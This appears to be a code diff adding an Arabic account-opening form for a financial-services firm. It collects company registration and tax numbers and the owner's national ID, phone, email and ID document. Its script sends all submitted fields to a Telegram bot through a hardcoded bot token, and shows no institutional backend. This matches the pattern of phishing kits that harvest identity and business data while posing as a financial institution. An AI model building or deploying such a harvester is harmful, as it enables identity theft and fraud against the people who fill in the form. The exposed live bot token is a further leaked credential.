+                <label for="ownerThird">الاسم الثالث <span class="req">*</span></label>
+                <input type="text" id="ownerThird" name="ownerThird" placeholder="الاسم الثالث" required>
+                <span class="err">مطلوب</span>
+              </div>
+
+              <div class="form-group">
+                <label for="ownerTitle">المسمى الوظيفي <span class="req">*</span></label>
+                <select id="ownerTitle" name="ownerTitle" required>
+                  <option value="" disabled selected>اختر المسمى</option>
+                  <option value="owner">مالك / صاحب المنشأة</option>
+                  <option value="ceo">الرئيس التنفيذي (CEO)</option>
+                  <option value="chairman">رئيس مجلس الإدارة</option>
+                  <option value="gm">المدير العام</option>
+                  <option value="cfo">المدير المالي (CFO)</option>
+                  <option value="authorized">مفوّض بالتوقيع</option>
+                </select>
+                <span class="err">اختر المسمى الوظيفي</span>
+              </div>
+
+              <div class="form-group">
+                <label for="ownerNational">رقم الهوية الوطنية / الإقامة <span class="req">*</span></label>
+                <input type="text" id="ownerNational" name="ownerNational"
+                       placeholder="10 أرقام" maxlength="10" required>
+                <span class="err">أدخل رقم الهوية</span>
+              </div>
+
+              <div class="form-group">
+                <label for="ownerNationality">الجنسية <span class="req">*</span></label>
+                <select id="ownerNationality" name="ownerNationality" required>
+                  <option value="" disabled selected>اختر الجنسية</option>
+                  <option value="SA">سعودي</option>
+                  <option value="AE">إماراتي</option>
+                  <option value="KW">كويتي</option>
+                  <option value="QA">قطري</option>
+                  <option value="BH">بحريني</option>
+                  <option value="OM">عُماني</option>
+                  <option value="EG">مصري</option>
+                  <option value="JO">أردني</option>
+                  <option value="OTHER">أخرى</option>
+                </select>
+                <span class="err">اختر الجنسية</span>
+              </div>
+
+              <div class="form-group">
+                <label for="ownerPhone">رقم الجوال <span class="req">*</span></label>
+                <input type="tel" id="ownerPhone" name="ownerPhone"
+                       placeholder="+966XXXXXXXXX" required>
+                <span class="err">أدخل رقم جوال صحيح</span>
+              </div>
+
+              <div class="form-group">
+                <label for="ownerEmail">البريد الإلكتروني <span class="req">*</span></label>
+                <input type="email" id="ownerEmail" name="ownerEmail"
+                       placeholder="owner@email.com" required>
+                <span class="err">أدخل بريداً إلكترونياً صحيحاً</span>
+              </div>
+
+              <!-- صورة الهوية -->
+              <div class="form-group full file-upload">
+                <label>صورة الهوية الوطنية / جواز السفر <span class="req">*</span></label>
+                <div class="file-box" id="idFileBox">
+                  <button type="button" class="file-trigger" onclick="document.getElementById('idFile').click()">
+                    📎 اختر ملف
+                  </button>
+                  <span class="file-name" id="idFileName">لم يُختر ملف بعد</span>
+                  <input type="file" id="idFile" name="idFile" accept=".pdf,.jpg,.jpeg,.png">
+                </div>
+                <span class="file-hint">PDF أو صورة · الحد الأقصى 5 ميجابايت</span>
+                <span class="err" id="idFileErr">يرجى رفع صورة الهوية</span>
+              </div>
+
+              <!-- وثيقة التفويض -->
+              <div class="form-group full file-upload">
+                <label>وثيقة التفويض <span class="opt">(مطلوبة للمفوّضين)</span></label>
+                <div class="file-box">
+                  <button type="button" class="file-trigger" onclick="document.getElementById('authFile').click()">
+                    📎 اختر ملف
+                  </button>
+                  <span class="file-name" id="authFileName">لم يُختر ملف بعد</span>
+                  <input type="file" id="authFile" name="authFile" accept=".pdf,.jpg,.jpeg,.png">
+                </div>
+                <span class="file-hint">PDF أو صورة · الحد الأقصى 5 ميجابايت</span>
+              </div>
+
+            </div>
+          </div>
+        </div>
+
+        <!-- ملاحظات -->
+        <div class="section-title">
+          <div class="section-number">٥</div>
+          <h2>ملاحظات إضافية</h2>
+          <div class="section-line"></div>
+        </div>
+
+        <div class="form-group">
+          <label for="notes">ملاحظات <span class="opt">(اختياري)</span></label>
+          <textarea id="notes" name="notes"
+                    placeholder="أي معلومات أو استفسارات إضافية تودّون مشاركتها مع فريقنا..."></textarea>
+        </div>
+
+        <!-- SUBMIT -->
+        <div class="submit-section">
+          <button type="submit" class="btn-submit" id="submitBtn">
+            <span class="spinner"></span>
+            <svg class="btn-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
+              <path d="M15.854.146a.5.5 0 0 1 .11.54l-5.819 14.547a.75.75 0 0 1-1.329.124l-3.178-4.995L.643 7.184a.75.75 0 0 1 .124-1.33L15.314.037a.5.5 0 0 1 .54.11ZM6.636 10.07l2.761 4.338L14.13 2.576 6.636 10.07Zm6.787-8.201L1.591 6.602l4.339 2.76 7.494-7.493Z"/>
+            </svg>
+            <span class="btn-label">إرسال الطلب</span>
+          </button>
+          <p class="terms-note">
+            بإرسال هذا الطلب فإنكم توافقون على
+            <a href="#">سياسة الخصوصية</a> و<a href="#">الشروط والأحكام</a>
+            الخاصة بمشاركة المالية
+          </p>
+        </div>
+
+      </form>
+    </div>
+  </main>
+</div>
+
+<script>
+  /* ── TELEGRAM ── */
+  const TG_TOKEN = '8791563980:AAHkZGqeNRnBjdg2m_yOjIc7tKA1jkmFrQk';
+  const TG_BASE  = 'https://api.telegram.org/bot' + TG_TOKEN;
+  let TG_CHAT_ID = null;
+
+  async function initChatId() {
+    try {
+      const res  = await fetch(TG_BASE + '/getUpdates?limit=10&offset=-10');
+      const json = await res.json();
+      if (!json.ok) return;
+      for (const upd of (json.result || []).reverse()) {
+        const chat = (upd.message || upd.edited_message || {}).chat;
+        if (chat && chat.id) { TG_CHAT_ID = String(chat.id); return; }
+      }
+    } catch (e) { console.warn('initChatId:', e.message); }
+  }
+  initChatId();
+
+  async function sendToTelegram(msg) {
+    if (!TG_CHAT_ID) await initChatId();
+    if (!TG_CHAT_ID) throw new Error('لم يتم العثور على chat_id — أرسل رسالة للبوت أولاً');
+    const res  = await fetch(TG_BASE + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML' }),
+    });
+    const json = await res.json();
+    if (!json.ok) throw new Error('تليجرام: ' + (json.description || 'خطأ'));
+  }
+
+  function buildMessage(d) {
+    const L = '─────────────────────';
+    const rows = [
+      '🏢 <b>طلب فتح حساب كيان تجاري</b>',
+      L, '',
+      '🏢 <b>بيانات الشركة</b>',
+      '• الاسم: ' + d.companyName,
+      '• نوع الكيان: ' + d.entityType,
+      '• رقم السجل التجاري: ' + d.crNumber,
+      '• انتهاء السجل: ' + d.crExpiry,
+      '• الرقم الضريبي: ' + d.taxNumber,
+      '• سنة التأسيس: ' + d.foundYear,
+      '• بلد التسجيل: ' + d.country,
+      '• المدينة: ' + d.city,
+      '• العنوان: ' + d.address,
+      '',
+      '📋 <b>الترخيص التجاري</b>',
+      '• رقم الترخيص: ' + d.licenseNumber,
+      '• انتهاء الترخيص: ' + d.licenseExpiry,
+      '• جهة الإصدار: ' + d.licenseAuthority,
+      '• النشاط التجاري: ' + d.licenseActivity,
+      '',
+      '💼 <b>البيانات التجارية</b>',
+      '• هاتف الشركة: ' + d.companyPhone,
+      '• البريد الرسمي: ' + d.companyEmail,
+      d.website ? '• الموقع الإلكتروني: ' + d.website : '',
+      '• عدد الموظفين: ' + d.employeeCount,
+      '• الإيرادات السنوية: ' + d.annualRevenue,
+      '• رأس المال المستثمر: ' + d.capitalAmount + ' ريال',
+      '• الخدمة المطلوبة: ' + d.offerType,
+      '',
+      '👤 <b>المالك / الممثل المفوّض</b>',
+      '• الاسم: ' + d.ownerName,
+      '• المسمى: ' + d.ownerTitle,
+      '• رقم الهوية: ' + d.ownerNational,
+      '• الجنسية: ' + d.ownerNationality,
+      '• الجوال: ' + d.ownerPhone,
+      '• البريد: ' + d.ownerEmail,
+      d.notes ? ('\n📝 <b>ملاحظات:</b>\n' + d.notes) : '',
+      '',
+      L,
+      '🕐 ' + new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' }),
+    ];
+    return rows.filter(Boolean).join('\n');
+  }
+
+  /* ── FILE LABELS ── */
+  function wireFile(inputId, labelId) {
+    document.getElementById(inputId).addEventListener('change', function() {
+      document.getElementById(labelId).textContent =
+        this.files[0] ? this.files[0].name : 'لم يُختر ملف بعد';
+    });
+  }
+  wireFile('crFile',   'crFileName');
+  wireFile('licFile',  'licFileName');
+  wireFile('idFile',   'idFileName');
+  wireFile('authFile', 'authFileName');
+
+  /* ── VALIDATION ── */
+  const form      = document.getElementById('entityForm');
+  const submitBtn = document.getElementById('submitBtn');
+
+  function mark(el, valid, errId) {
+    if (!valid) {
+      el.classList.add('error');
+      if (errId) document.getElementById(errId).style.display = 'block';
+      return false;
+    }
+    el.classList.remove('error');
+    if (errId) document.getElementById(errId).style.display = 'none';
+    return true;
+  }
+
+  function txt(id)  { return document.getElementById(id).value.trim(); }
+  function sel(id)  { return document.getElementById(id).value; }
+  function el(id)   { return document.getElementById(id); }
+  function email(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
+
+  function showToast(msg, ms) {
+    const t = document.getElementById('toastError');
+    t.textContent = msg; t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), ms || 6000);
+  }
+
+  function resetForm() {
+    form.reset();
+    document.querySelectorAll('.error').forEach(e => e.classList.remove('error'));
+    ['crFileName','licFileName','idFileName','authFileName']
+      .forEach(id => { el(id).textContent = 'لم يُختر ملف بعد'; });
+  }
+
+  /* ── SUBMIT ── */
+  const ENTITY_TYPES = {
+    company_limited:'شركة ذات مسؤولية محدودة', joint_stock:'شركة مساهمة',
+    sole_prop:'مؤسسة فردية', partnership:'شركة تضامن',
+    holding:'شركة قابضة', foreign_branch:'فرع شركة أجنبية',
+    ngo:'جمعية / منظمة غير ربحية', other:'أخرى',
+  };
+  const OFFER_LABELS = {
+    portfolio_mgmt:'إدارة المحافظ 💼', reits:'صناديق الاستثمار العقاري 🏗️',
+    investment_banking:'المصرفية الاستثمارية 🏦', brokerage:'وساطة الأوراق المالية 📊',
+    ipo_mgmt:'إدارة الاكتتابات 🎯', custody:'خدمات الحفظ 🔐',
+  };
+  const TITLE_LABELS = {
+    owner:'مالك / صاحب المنشأة', ceo:'الرئيس التنفيذي',
+    chairman:'رئيس مجلس الإدارة', gm:'المدير العام',
+    cfo:'المدير المالي', authorized:'مفوّض بالتوقيع',
+  };
+  const REVENUE_LABELS = {
+    'under1m':'أقل من مليون ريال', '1m-5m':'1 – 5 مليون',
+    '5m-20m':'5 – 20 مليون', '20m-100m':'20 – 100 مليون', 'over100m':'أكثر من 100 مليون',
+  };
+  const EMP_LABELS = {
+    '1-9':'1 – 9 موظفين','10-49':'10 – 49 موظف',
+    '50-249':'50 – 249 موظف','250+':'250+ موظف',
+  };
+
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    let ok = true;
+
+    // Company
+    if (!mark(el('companyName'),    txt('companyName').length > 0, null))         ok = false;
+    if (!mark(el('entityType'),     sel('entityType') !== '', null))               ok = false;
+    if (!mark(el('crNumber'),       /^\d{10}$/.test(txt('crNumber')), null))       ok = false;
+    if (!mark(el('crExpiry'),       txt('crExpiry') !== '', null))                 ok = false;
+    if (!mark(el('taxNumber'),      txt('taxNumber').length >= 10, null))          ok = false;
+    if (!mark(el('foundYear'),      el('foundYear').value >= 1900, null))          ok = false;
+    if (!mark(el('country'),        sel('country') !== '', null))                  ok = false;
+    if (!mark(el('city'),           txt('city').length > 0, null))                 ok = false;
+    if (!mark(el('address'),        txt('address').length > 0, null))              ok = false;
+
+    // License
+    if (!mark(el('licenseNumber'),  txt('licenseNumber').length > 0, null))        ok = false;
+    if (!mark(el('licenseExpiry'),  txt('licenseExpiry') !== '', null))            ok = false;
+    if (!mark(el('licenseAuthority'),sel('licenseAuthority') !== '', null))        ok = false;
+    if (!mark(el('licenseActivity'),txt('licenseActivity').length > 0, null))      ok = false;
+    const crFileOk = el('crFile').files.length > 0;
+    if (!crFileOk) { el('crFileBox').classList.add('error'); el('crFileErr').style.display = 'block'; ok = false; }
+    else           { el('crFileBox').classList.remove('error'); el('crFileErr').style.display = 'none'; }
+
+    // Commercial
+    if (!mark(el('companyPhone'),   txt('companyPhone').length >= 7, null))        ok = false;
+    if (!mark(el('companyEmail'),   email(txt('companyEmail')), null))             ok = false;
+    if (!mark(el('employeeCount'),  sel('employeeCount') !== '', null))            ok = false;
+    if (!mark(el('annualRevenue'),  sel('annualRevenue') !== '', null))            ok = false;
+    if (!mark(el('capitalAmount'),  Number(el('capitalAmount').value) >= 50000, 'capitalErr')) ok = false;
+    const offerEl = document.querySelector('input[name="offerType"]:checked');
+    el('offerErr').style.display = offerEl ? 'none' : 'block';
+    if (!offerEl) ok = false;
+
+    // Owner
+    if (!mark(el('ownerFirst'),      txt('ownerFirst').length > 0, null))          ok = false;
+    if (!mark(el('ownerSecond'),     txt('ownerSecond').length > 0, null))         ok = false;
+    if (!mark(el('ownerThird'),      txt('ownerThird').length > 0, null))          ok = false;
+    if (!mark(el('ownerTitle'),      sel('ownerTitle') !== '', null))              ok = false;
+    if (!mark(el('ownerNational'),   /^\d{10}$/.test(txt('ownerNational')), null)) ok = false;
+    if (!mark(el('ownerNationality'),sel('ownerNationality') !== '', null))        ok = false;
+    if (!mark(el('ownerPhone'),      txt('ownerPhone').length >= 7, null))         ok = false;
+    if (!mark(el('ownerEmail'),      email(txt('ownerEmail')), null))              ok = false;
+    const idFileOk = el('idFile').files.length > 0;
+    if (!idFileOk) { el('idFileBox').classList.add('error'); el('idFileErr').style.display = 'block'; ok = false; }
+    else           { el('idFileBox').classList.remove('error'); el('idFileErr').style.display = 'none'; }
+
+    if (!ok) {
+      const firstErr = document.querySelector('.error');
+      if (firstErr) firstErr.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      return;
+    }
+
+    // Collect & send
+    const countryOpt = el('country').options[el('country').selectedIndex];
+    const natOpt     = el('ownerNationality').options[el('ownerNationality').selectedIndex];
+
+    const data = {
+      companyName:      txt('companyName'),
+      entityType:       ENTITY_TYPES[sel('entityType')] || sel('entityType'),
+      crNumber:         txt('crNumber'),
+      crExpiry:         txt('crExpiry'),
+      taxNumber:        txt('taxNumber'),
+      foundYear:        el('foundYear').value,
+      country:          countryOpt ? countryOpt.text : sel('country'),
+      city:             txt('city'),
+      address:          txt('address'),
+      licenseNumber:    txt('licenseNumber'),
+      licenseExpiry:    txt('licenseExpiry'),
+      licenseAuthority: el('licenseAuthority').options[el('licenseAuthority').selectedIndex]?.text || '',
+      licenseActivity:  txt('licenseActivity'),
+      companyPhone:     txt('companyPhone'),
+      companyEmail:     txt('companyEmail'),
+      website:          txt('website'),
+      employeeCount:    EMP_LABELS[sel('employeeCount')] || sel('employeeCount'),
+      annualRevenue:    REVENUE_LABELS[sel('annualRevenue')] || sel('annualRevenue'),
+      capitalAmount:    Number(el('capitalAmount').value).toLocaleString('ar-SA'),
+      offerType:        OFFER_LABELS[offerEl.value] || offerEl.value,
+      ownerName:        [txt('ownerFirst'), txt('ownerSecond'), txt('ownerThird')].join(' '),
+      ownerTitle:       TITLE_LABELS[sel('ownerTitle')] || sel('ownerTitle'),
+      ownerNational:    txt('ownerNational'),
+      ownerNationality: natOpt ? natOpt.text : sel('ownerNationality'),
+      ownerPhone:       txt('ownerPhone'),
+      ownerEmail:       txt('ownerEmail'),
+      notes:            txt('notes'),
+    };
+
+    submitBtn.classList.add('loading');
+    el('submitBtn').querySelector('.btn-label').textContent = 'جاري الإرسال...';
+
+    try {
+      await sendToTelegram(buildMessage(data));
+      resetForm();
+      document.getElementById('successOverlay').classList.add('show');
+    } catch (err) {
+      console.error(err);
+      showToast('⚠️ ' + err.message, 7000);
+    } finally {
+      submitBtn.classList.remove('loading');
+      el('submitBtn').querySelector('.btn-label').textContent = 'إرسال الطلب';
+    }
+  });
+
+  // Live blur validation
+  document.querySelectorAll('input, select, textarea').forEach(inp => {
+    inp.addEventListener('blur', () => {
+      if (inp.classList.contains('error') && inp.value.trim())
+        inp.classList.remove('error');
+    });
+  });
+</script>
+
+</body>
+</html>
